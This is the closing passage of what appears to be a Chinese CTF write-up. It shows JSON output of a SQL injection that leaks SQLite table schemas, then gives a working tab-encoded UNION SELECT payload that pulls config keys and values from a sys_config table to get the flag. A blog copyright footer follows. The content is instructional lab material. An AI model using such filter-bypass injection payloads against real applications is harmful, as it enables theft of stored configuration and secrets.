    "cpu": 2,

    "ram": 3,

    "status": "sqlite_sequence",

    "lastChecked": null

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_sequence",

    "lastChecked": "CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_sequence",

    "lastChecked": "CREATE TABLE sqlite_sequence(name,seq)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sqlite_sequence",

    "lastChecked": "CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sys_config",

    "lastChecked": null

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sys_config",

    "lastChecked": "CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sys_config",

    "lastChecked": "CREATE TABLE sqlite_sequence(name,seq)"

  },

  {

    "id": 1,

    "cpu": 2,

    "ram": 3,

    "status": "sys_config",

    "lastChecked": "CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"

  },

  {

    "id": 1,

    "cpu": "23%",

    "ram": "45%",

    "status": "Online",

    "lastChecked": "2025-10-15 09:25:27"

  }

]
```

接着注入查看表里面的内容  
`payload: `1%09union%09select%09\*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09config\_key%09FROM%09sys\_config)%09d%09join%09(SELECT%09config\_value%09FROM%09sys\_config)%09f\`  
得到 flag  
!\[\[Pasted image 20251015174145.png\]\]

正文完

0

版权声明：本站原创文章，由 于2025-10-15发表，共计18911字。

转载说明：除特殊说明外本站文章皆由CC-4.0协议发布，转载请注明出处。